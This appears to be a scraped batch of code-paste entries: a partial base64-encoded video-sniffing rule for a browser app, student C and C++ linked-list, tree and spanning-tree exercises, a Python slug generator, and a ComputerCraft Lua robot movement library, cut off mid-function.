iAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImF2YXRhclxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgaW1nOiBcXFxcXFxcImhpa2VyOi8vaW1hZ2VzL2FjY291bnRcXFxcXFxcIlxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgcmV0dXJuIGQyO1xcXFxuICAgIH1cXFxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCJ4NUFJXFxcIixcXFwicGF0aFxcXCI6XFxcIng1YWlcXFwiLFxcXCJydWxlXFxcIjpcXFwiJC5leHBvcnRzID0gZnVuY3Rpb24ocnVsZSwgYW5jaG9ySWQpIHtcXFxcbiAgICByZXR1cm4gJC50b1N0cmluZygocnVsZSwgYW5jaG9ySWQsIHdoaXRlKSA9PiB7XFxcXG4gICAgICAgIGlmICh3aW5kb3cuY2hlY2swID09IG51bGwpIHtcXFxcbiAgICAgICAgICAgIGZ1bmN0aW9uIGNoZWNrMCgpIHtcXFxcbiAgICAgICAgICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgaHRtbCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoXFxcXFxcXCJodG1sXFxcXFxcXCIpLmlubmVySFRNTDtcXFxcbiAgICAgICAgICAgICAgICAgICAgZmJhLnB1dFZhcihcXFxcXFxcImh0bWwwXFxcXFxcXCIsIGh0bWwpO1xcXFxuICAgICAgICAgICAgICAgICAgICBmYmEucGFyc2VMYXp5UnVsZUFzeW5jKCQkJCgpLmxhenlSdWxlKChydWxlLCB1cmwsIGFuY2hvcklkLCB3aGl0ZSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZCA9IFtdO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBodG1sID0gZ2V0VmFyKFxcXFxcXFwiaHRtbDBcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJWYXIoXFxcXFxcXCJodG1sMFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgd2ViID0gZmFsc2U7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCF3aGl0ZS5pbmNsdWRlcyh1cmwpKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwYXJzZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9wYXJzZT9ydWxlPVxcXFxcXFwiICsgcnVsZSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQgPSBwYXJzZShydWxlLCB3ZWIsIHVybCwgaHRtbCk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkLmxlbmd0aCA8IDEpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBhcnIgPSBwZGZhKGh0bWwsIFxcXFxcXFwiYm9keSYmaWZyYW1lXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGFyci5sZW5ndGggPiAwKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHNyYyA9IHBkZmgoYXJyWzBdLCBcXFxcXFxcImlmcmFtZSYmc3JjXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZyhcXFxcXFxcIuiOt+WPluWIsGlmcmFtZe+8mlxcXFxcXFwiICsgc3JjKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXdoaXRlLmluY2x1ZGVzKHNyYykpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHNyYyAmJiBzcmMuc3RhcnRzV2l0aChcXFxcXFxcImh0dHBcXFxcXFxcIikgJiYgIXNyYy5tYXRjaCgvXFxcXFxcXFwubXA0fFxcXFxcXFxcLm0zdTh8XFxcXFxcXFwubXAzfFxcXFxcXFxcLmZsdnxcXFxcXFxcXC5ta3YvKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHRtbCA9IHJlcXVlc3Qoc3JjKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQgPSBwYXJzZShydWxlLCB3ZWIsIHNyYywgaHRtbCk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZyhcXFxcXFxcIuWwneivleiOt+WPlmlmcmFtZeWksei0pVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZC5sZW5ndGggPiAwKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRbMF0udXJsID0gJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChhbmNob3JJZCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGRlc2MgPSBnZXRWYXIoYW5jaG9ySWQsIFxcXFxcXFwiMFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkZXNjID09IFxcXFxcXFwiMFxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFg1RGVzYyhcXFxcXFxcImZsb2F0JiZzY3JlZW4tMTcwXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB1dFZhcihhbmNob3JJZCwgXFxcXFxcXCIxXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoWDVEZXNjKFxcXFxcXFwiZmxvYXQmJjBcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHV0VmFyKGFuY2hvcklkLCBcXFxcXFxcIjBcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIGFuY2hvcklkICsgXFxcXFxcXCJ4NVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZFswXS50aXRsZSA9IFxcXFxcXFwi5bGV5byAL+aUtui1t1xcXFxcXFwiICsgZFswXS50aXRsZTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHV0VmFyKGFuY2hvcklkICsgXFxcXFxcXCJ4NVxcXFxcXFwiLCBcXFxcXFxcIjBcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlZnJlc2hYNURlc2MoXFxcXFxcXCJmbG9hdCYmMFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaXQgb2YgZCkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGV4dHJhID0gaXQuZXh0cmEgfHwge307XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHRyYS5jbHMgPSBcXFxcXFxcIng1YWlcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGl0LmV4dHJhID0gZXh0cmE7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVsZXRlSXRlbUJ5Q2xzKFxcXFxcXFwieDVhaVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWRkSXRlbUFmdGVyKGFuY2hvcklkLCBkKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9hc3QoXFxcXFxcXCJBSeWMuemFjeaIkOWKn1xcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGQubGVuZ3RoID4gMCkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2coXFxcXFxcXCJwYXJzZUxhenlSdWxlQXN5bmM6XFxcXFxcXCIgKyBkLmxlbmd0aCk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkLmxlbmd0aCA+IDAgPyBcXFxcXFxcIjFcXFxcXFxcIiA6IFxcXFxcXFwiMFxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZyhlLnRvU3RyaW5nKCkpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICB9LCBydWxlLCBsb2NhdGlvbi5ocmVmLCBhbmNob3JJZCwgd2hpdGUpLCAkJCQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFxcXFxcXFwiMFxcXFxcXFwiID09IGlucHV0KSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93LmNoZWNrYyA9IHdpbmRvdy5jaGVja2MgKyAxO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8qaWYgKHdpbmRvdy5jaGVja2MgPiAxMjApIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmJhLmxvZyhcXFxcXFxcIuaJp+ihjOi2hei/hzMw56eS77yM5peg5rOV6Kej5p6QXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7Ki9cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KHdpbmRvdy5jaGVjazAsIDI1MCk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgLy99XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5jaGVja3VybCA9IGxvY2F0aW9uLmhyZWY7XFxcXG5cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiBjaGVja3UwKCkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93LmNoZWNrdXJsICE9IGxvY2F0aW9uLmhyZWYpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vaGFzaOWPkeeUn+S6huWPmOWMllxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3cuY2hlY2tjID0gMDtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGVjazAoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIDIwMDApO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2V0VGltZW91dChjaGVja3UwLCAyNTApO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNoZWNrdTAoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgfSkpO1xcXFxuICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgZmJhLmxvZyhlLnRvU3RyaW5nKCkpO1xcXFxuICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KHdpbmRvdy5jaGVjazAsIDI1MCk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgd2luZG93LmNoZWNrYyA9IDA7XFxcXG4gICAgICAgICAgICB3aW5kb3cuY2hlY2swID0gY2hlY2swO1xcXFxuICAgICAgICAgICAgY2hlY2swKCk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9LCBydWxlLCBhbmNob3JJZCwgc3RvcmFnZTAuZ2V0SXRlbShcXFxcXFxcIndoaXRlXFxcXFxcXCIsIFtdKSk7XFxcXG59XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi6aaW6aG1XFxcIixcXFwicGF0aFxcXCI6XFxcImhvbWVcXFwiLFxcXCJydWxlXFxcIjpcXFwidmFyIGQgPSBbXTtcXFxcbmxldCB1cmwgPSDnvZHnq5k7XFxcXG5sZXQgYW5jaG9ySWQgPSB1cmw7XFxcXG5sZXQganMgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UveDVhaVxcXFxcXFwiKShNWV9SVUxFLnRpdGxlLCBhbmNob3JJZCk7XFxcXG5sZXQgaXRlID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3VcXFxcXFxcIikoTVlfUlVMRS50aXRsZSwgZ2V0SG9tZSh1cmwpKTtcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgdXJsOiB1cmwsXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwieDVfd2Vidmlld19zaW5nbGVcXFxcXFxcIixcXFxcbiAgICBkZXNjOiBcXFxcXFxcIjEwMCUmJmZsb2F0XFxcXFxcXCIsXFxcXG4gICAgcGljX3VybDogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICB1cmxJbnRlcmNlcHRvcjogaXRlLFxcXFxuICAgICAgICBjYW5CYWNrOiB0cnVlLFxcXFxuICAgICAgICBqczoganMsXFxcXG4gICAgICAgIGpzTG9hZGluZ0luamVjdDogdHJ1ZVxcXFxuICAgIH1cXFxcbn0pO1xcXFxuZC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgaWQ6IGFuY2hvcklkXFxcXG4gICAgfVxcXFxufSk7XFxcXG5cXFxcbnNldFJlc3VsdChkKTtcXFwifV1cIixcInByb3h5XCI6XCJcIn0iLCJ0aXRsZSI6IumdkuaYpeehrOi1t+adpeesrDHpm4blnKjnur/mkq3mlL4gLSBMSUJWSU8ifQ==
qvja5N72,doubly linkedList,moldovexc,C,Sunday 28th of May 2023 09:03:43 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct Task {
  char description[100];
  struct Task* next;
  struct Task* previous; 
};

struct Task* createTask(char description[]){
 struct Task* newTask = (struct Task*)malloc(sizeof(struct Task));
 strcpy(newTask->description, description);
 newTask->next = NULL;
 newTask->previous = NULL;
 return newTask;
}

void addTask(struct Task** head, struct Task* newTask){
 if(*head == NULL) {
   *head = newTask;
 } else {
   struct Task* currentElement = *head;
 while(currentElement->next != NULL){
  currentElement = currentElement->next;
  }
 currentElement->next = newTask;
 newTask->previous = currentElement;
 }
}

struct Task* displayFirstTask(struct Task* head){
 if (head == NULL){
   printf(""No tasks found!\n"");
 } else{
  struct Task* firstTask = head;
  while(firstTask->previous !=NULL){
   firstTask = firstTask-> previous;
  }
  return firstTask;
 }
}

void deleteTask(struct Task** head, struct Task* task){
 if (*head == task){
   *head = task->next;
 }
 if(task->previous !=NULL){
  task->previous->next = task->next;
 }
 if(task->next !=NULL){
  task->next->previous = task->previous;
 }
 free(task);
}
void displayTasks(struct Task* head){
 struct Task* currentTask = head;
 if(currentTask == NULL){
  printf(""No tasks found!\n"");
 } else{
  printf(""Tasks:\n"");
  while(currentTask !=NULL){
   printf(""%s\n"", currentTask->description);
   currentTask = currentTask->next;
  }
 }
}
 void freeAllTasks(struct Task** head){
  struct Task* currentTask = *head;
  while(currentTask !=NULL){
   struct Task* next = currentTask->next;
   free(currentTask);
   currentTask = next;
  }
  *head = NULL;
 }

 int main(){
   
  //initialize queue
  struct Task* tasks = NULL;
 
  //initialize tasks
  struct Task* firstTask = createTask(""Task 1"");
  struct Task* secondTask = createTask(""Task 2"");
  struct Task* thirdTask = createTask(""Task 3"");

  //add tasks to queue
  addTask(&tasks,firstTask);
  addTask(&tasks->next, secondTask);
  addTask(&tasks->next, thirdTask);
 
  // print  all tasks
  displayTasks(tasks);
  //print first element in fifo
  struct Task* firstTaskInQueue = displayFirstTask(tasks);
  if(firstTask !=NULL){
   printf(""First Task: %s\n"", firstTaskInQueue -> description);
 }
  //delete specific task 
  deleteTask(&tasks,firstTask);
  //show result
  displayTasks(tasks);
  //delete all tasks to save memory
  freeAllTasks(&tasks);
  //show result
  displayTasks(tasks);
 }"
rq72726Z,database to slugs (fun 4),mate2code,Python,Sunday 28th of May 2023 08:59:21 AM CDT,"import itertools
from collections import defaultdict
from string import ascii_lowercase as alphabet

flatten = itertools.chain.from_iterable
def double_generator(gen): return itertools.tee(gen, 2)


database = {
    0: {'name1': 'John', 'name2': 'Spam', 'born': '1985'},  # JohnSpam85a
    1: {'name1': 'John', 'name2': 'Spam', 'born': '1985'},  # JohnSpam85b
    2: {'name1': 'John', 'name2': 'Eggs', 'born': '1991'},  # JohnEggs91
    3: {'name1': 'John', 'name2': 'Eggs', 'born': '1992'},  # JohnEggs92
    4: {'name1': 'Emma', 'name2': 'Fish', 'born': '1995'},  # EmmaFish95a
    5: {'name1': 'Emma', 'name2': 'Fish', 'born': '1995'},  # EmmaFish95b
    6: {'name1': 'Mary', 'name2': 'Beer', 'born': '2000'},  # MaryBeer
    7: {'name1': 'Mary', 'name2': 'Wine', 'born': '2000'},  # MaryWine
    8: {'name1': 'Owen', 'name2': 'Wine', 'born': '2000'},  # Owen
    9: {'name1': 'Ruth', 'name2': 'Milk', 'born': '2000'}   # Ruth
}


def find_duplicates(number_to_slug, dup_gen_to_refine):
    slug_to_numbers = defaultdict(list)
    if dup_gen_to_refine is not None:
        for number in flatten(dup_gen_to_refine):
            slug = number_to_slug[number]
            slug_to_numbers[slug].append(number)
    else:
        for number, slug in number_to_slug.items():
            slug_to_numbers[slug].append(number)
    for block in slug_to_numbers.values():
        if len(block) > 1:
            yield block


def find_slugs(database):

    """"""
	Assign unique slugs to set of people. Slugs are as short as possible. (New elements only added to ensure uniqueness.)
    https://codereview.stackexchange.com/questions/285146
	""""""

    step_functions = [
        lambda _, n: database[n]['name1'],
        lambda _, n: database[n]['name2'],
        lambda _, n: database[n]['born'][2:4],
        lambda i, _: alphabet[i]
    ]

    number_to_slug = {n: '' for n in database}
    dup_gen_to_refine = None

    for step_fun in step_functions:
        dup_gen = find_duplicates(number_to_slug, dup_gen_to_refine)
        dup_gen_to_append, dup_gen_to_refine = double_generator(dup_gen)
        for block in dup_gen_to_append:
            for i, n in enumerate(block):
                number_to_slug[n] += step_fun(i, n)

    return number_to_slug
"
7tJts6Lb,Nika dlist,Technoblade777,C++,Sunday 28th of May 2023 08:43:17 AM CDT,"#include<iostream>
using namespace std;
struct dlist
{
    int info;
    dlist *prev, *next;
};



int main()
{
    int k = 0;  //проверка на случай наличия одного элемента в спике
    //объявление головы списка
    int x;
    cin >> x; k++;
    dlist *head = new dlist;
    head->info = x;
    head->prev = nullptr; head->next = nullptr;
    dlist *p = new dlist;
    p = head;

    //ввод тела списка
    cin >> x;
    while(x!=0)
    {
        k++;
        dlist *r = new dlist;
        r->info = x; r->prev=nullptr; r->next=nullptr;
        p->next = r;
        r->prev=p;
        p = r;
        cin >> x;
    }

    if(k==1){cout << ""В списке недостаточное количество элементов""; return 0;}

    //проверка на убывание
    int f = 1;
    p = head->next;
    while(p!=nullptr)
    {
        if(p->info>=p->prev->info){f = 0; break;}
        p=p->next;
    }

    if(f == 1)
    {
        p = head->next;
        while(p!=nullptr)
        {
            if(p->info%5==0&&p->prev->info%5==0)
            {
                int x = p->info + p->prev->info;
                dlist *r = new dlist;
                r->info = x;
                r->prev = p->prev;
                r->next = p;
                p->prev->next = r;
                p->prev = r;
            }
            p = p->next;
        }
    }
    else {
        int a, b;
        cout << ""a: "";
        cin >> a;
        cout << ""b: "";
        cin >> b;
        p = head;
        while (p != nullptr) {
            if (p->next == nullptr) { break; }
            if (p->info >= a && p->info <= b) {
                dlist *r;
                if (p->next->next != nullptr) //... p y z NULL
                {
                    r = p->next;
                    p->next = p->next->next;
                    p->next->prev = p;
                    r->next = nullptr;
                    r->prev = nullptr;
                    delete r;
                    p = p->next;
                } else if (p->next != nullptr)//... p y NULL
                {
                    r = p->next;
                    p->next = nullptr;
                    r->next = nullptr;
                    r->prev = nullptr;
                    delete r;
                    p = p->next;
                } else {
                    p = p->next;
                }
            } else {
                p = p->next;
            }
        }
    }
    //вывод списка
    p = head;
    while(p!=nullptr)
    {
        cout << p->info << "" "";
        p = p->next;
    }

    //удаление списка
    while(head!=nullptr)
    {
        dlist *r = head;
        head = head->next;
        delete r;
    }
}"
RUD51nn6,Глубина добавляемых элементов,pasholnahuy,C++,Sunday 28th of May 2023 08:38:49 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <cmath>
#include <tuple>
#include <set>
#include <map>
#include <unordered_map>

using namespace std;

class BST {
    struct Node {
        int key;
        int depth;
        Node *l = nullptr, *r = nullptr;
        explicit Node(int key) : key(key) {}
    }
            *root = nullptr;

    bool contains(Node *n, int key) const {
        if (!n) {
            return false;
        } else if (key == n->key) {
            return true;
        } else if (key > n->key) {
            return contains(n->r, key);
        } else {
            return contains(n->l, key);
        }
    }

    void insert(Node *n, int key) {
        if (!root) {
            root = new Node(key);
            return;
        }
        if (key == n->key) {
            return;
        }
        if (key < n->key) {
            if (n->l) {
                insert(n->l, key);
            } else {
                n->l = new Node(key);
            }

        } else {
            if (n->r) {
                insert(n->r, key);
            } else {
                n->r = new Node(key);
            }
        }
    }
    void MakeDepth(Node *n, int cur_depth){
        if (n == nullptr){
            return;
        }
        n->depth = cur_depth;
        depths[n->key] = n->depth;
        MakeDepth(n->l, cur_depth+1);
        MakeDepth(n->r, cur_depth+1);

    };

public:
    map<int, int> depths;
    bool contains(int key) const {
        return contains(root, key);
    }

    void insert(int key) {
        return insert(root, key);
    }

    void MakeDepth(){
        return MakeDepth(root, 1);
    }
};

int main() {
    int n = -1;
    BST tree;
    vector<int> vec;
    while (n != 0) {
        cin >> n;
        if (n != 0) {
            vec.emplace_back(n);
            tree.insert(n);
        }
    }
    tree.MakeDepth();
    for (auto el: vec){
        cout << tree.depths[el] << "" "";
    }
    return 0;
};"
Av9k7kGS,Остов с наименьшим максимальным ребром,pasholnahuy,C++,Sunday 28th of May 2023 08:13:12 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <cmath>
#include <iomanip>
#include <tuple>
#include <map>

using namespace std;

class DSU {
public:
    vector<int> parent;
    vector<int> height;

    DSU(int n) {
        parent.resize(n);
        for (int i = 0; i < n; ++i) {
            parent[i] = i;
        }
        height.assign(n, 0);
    }

    int findRoot(int v) {
        if (v == parent[v]) {
            return v;
        }
        int ans = findRoot(parent[v]);
        parent[v] = ans;
        return ans;
    }

    void Union(int v1, int v2) {
        if (height[v1] >= height[v2]) {
            parent[v2] = v1;
            height[v1] = max(height[v1], height[v2] + 1);
        } else {
            parent[v1] = v2;
            height[v2] = max(height[v2], height[v1] + 1);
        }
    }


};

int main() {
    int n, m;
    cin >> n >> m;
    vector<pair<double, pair<int, int>>> edges;
    map<pair<int, int>, int> edges_num;
    for (int i = 0; i < m; ++i) {
        int x, y, w;
        cin >> x >> y >> w;
        edges.push_back({w, {--x, --y}});
        if (!edges_num.contains({x, y})){
            edges_num[{x, y}] = i;
        }
    }
    DSU graph(n);
    sort(edges.begin(), edges.end());
    double ans = 0;
    for (auto [weight, coords]: edges) {
        if (graph.findRoot(coords.first) != graph.findRoot(coords.second)){
            graph.Union(graph.findRoot(coords.first), graph.findRoot(coords.second));
            ans += weight;
            cout << edges_num[coords] + 1 << "" "";
        }
    }
//    cout << '\n' << ans;
    return 0;
};"
e9uMs0VB,robot,pluggeman,Lua,Sunday 28th of May 2023 08:11:29 AM CDT,"local x = 0
local y = 0
local z = 0
local direction = 0

DIRECTION_SOUTH = 0
DIRECTION_WEST = 1
DIRECTION_NORTH = 2
DIRECTION_EAST = 3

local CONFIG_PATH = ""robot_config""

function load()
    if fs.exists(CONFIG_PATH) then
        handle = fs.open(CONFIG_PATH, 'r')
        x = tonumber(handle.readLine())
        y = tonumber(handle.readLine())
        z = tonumber(handle.readLine())
        direction = tonumber(handle.readLine())
        handle.close()
    else
        initGPS()
    end
end

function save()
    handle = fs.open(CONFIG_PATH, 'w')
    handle.writeLine(x)
    handle.writeLine(y)
    handle.writeLine(z)
    handle.writeLine(direction)
    handle.close()
end

function log()
    print(""x: "" .. x)
    print(""y: "" .. y)
    print(""z: "" .. z)
    print(""dir: "" .. direction)
end

function initGPS()
    term.write(""x-pos: "")
    x = tonumber(read())
    term.write(""y-pos: "")
    y = tonumber(read())
    term.write(""z-pos: "")
    z = tonumber(read())
    term.write(""direction (0-3)"")
    direction = tonumber(read())
    save()
end

function getX()
    return x
end
function getY()
    return y
end
function getZ()
    return z
end
function getDirection()
    return direction
end

function moveX(count, cb)
    if count > 0 then
        turnTo(3)
    elseif count < 0 then
        turnTo(1)
    end
    forward(math.abs(count), cb)
end

function moveToX(c, cb)
    moveX(c - x, cb)
end

function moveY(count, cb)
    if count > 0 then
        up(count, cb)
    elseif count < 0 then
        down(math.abs(count), cb)
    end
end

function moveToY(c, cb)
    moveY(c - y, cb)
end

function moveZ(count, cb)
    if count > 0 then
        turnTo(0)
    elseif count < 0 then
        turnTo(2)
    end
    forward(math.abs(count), cb)
end

function moveToZ(c, cb)
    moveZ(c - z, cb)
end

function move(cx, cy, cz, cb)
    moveX(cx, cb)
    moveY(cy, cb)
    moveZ(cz, cb)
end

function moveTo(cx, cy, cz, cb)
    moveToX(cx, cb)
    moveToY(cy, cb)
    moveToZ(cz, cb)
end

function forward(count, cb)
    count = count or 1
    for i = 1, count do
        while not turtle.forward() do
            turtle.dig()
        end
        if direction == DIRECTION_SOUTH then
            z = z + 1
        elseif direction == DIRECTION_NORTH then
            z = z - 1
        elseif direction == DIRECTION_WEST then
            x = x - 1
        elseif direction == DIRECTION_EAST then
            x = x + 1
        end
        if cb then cb() end
    end
end

function back(count, cb)
    count = count or 1
    for i = 1, count do
        if turtle.back() then
            if direction == DIRECTION_SOUTH then
                z = z + 1
            elseif direction == DIRECTION_NORTH then
                z = z - 1
            elseif direction == DIRECTION_WEST then
                x = x - 1
            elseif direction == DIRECTION_EAST then
                x = x + 1
            end
        end
        if cb then cb() end
    end
end

function down(count, cb)
    count = count or 1
    for i = 1, count do
        while not turtle.down() do
            turtle.digDown()
        end
        y = y - 1 
        if cb then cb() end
    end
end

function up(count, cb)
    count = count or 1
    for i = 1, count do
        while not turtle.up() do
            turtle.digUp()
        end
        y = y + 1
        if cb then cb() end
    end
end

function turnleft(count, cb)
    count = count or 1
    for i = 1, count do
        if turtle.turnLeft() then
            if direction <= 0 then
                direction = 3
            else
                direction = direction - 1
            end
            if cb then cb() end
        end
    end
end

function turnright(count, cb)
    count = count or 1
    for i = 1, count do
        if turtle.turnRight() then
            if direction >= 3 then
                direction = 0
            else
                direction = direction + 1
            end
            if cb then cb() end
        end
    end
end

function turnTo(dir, cb)
    count = direction - dir
    dif = math.abs(count)
    if dif > 2 then
        count = -(count / dif)
    end
    if count > 0 then
        turnleft(count)
    elseif count < 0 then
